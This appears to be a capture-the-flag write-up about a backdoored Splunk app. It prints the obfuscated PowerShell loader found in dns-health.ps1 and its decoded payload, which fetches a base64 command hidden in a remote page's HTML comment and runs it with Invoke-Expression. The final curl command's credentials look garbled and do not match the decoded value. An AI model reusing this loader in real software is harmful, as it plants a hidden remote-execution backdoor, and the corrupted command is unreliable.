# Backdoored Splunk II
You've probably seen Splunk being used for good, but have you seen it used for evil?

NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag.


## Solution
In `bin/powershell`, there is a file called `dns-health.ps1` which contains the backdoor. The line looked very off due to the strange capitalization in addition to numbers that looked a lot like ASCII numbers.

```powershell
[STRinG]::JoIN('',[chAr[]](36 , 79 ,83 , 86, 69 ,82 ,32, 61,32,39 , 105, 101, 120 , 32 , 40 ,91 ,83 , 121 , 115 , 116,101 , 109, 46,84 ,101 ,120 [...]
```
I decoded it, which gave me a base64 encoded string, which was decoded again:

```powershell
b'# $PORT below is dynamic to the running service of the `Start` button\r\n@($html = (Invoke-WebRequest http://challenge.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dGhpc19pc190aGVfaHR0cF9zZXJ2ZXJfc2VjcmV0")} -UseBasicParsing).Content\r\nif ($html -match \'<!--(.*?)-->\') {\r\n    $value = $matches[1]\r\n    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))\r\n    Invoke-Expression $command\r\n})'
```

Then, I simply had to send this request to the server using curl.
`curl -H "Authorization: Basic YmFzaWMyRvb3JmjNRvb3J6dGh2c3E5wc190aGVaSF0sY9elpYSjJaWEpfr2Vj`itVjAi" http://challenge.ctf.games:30576`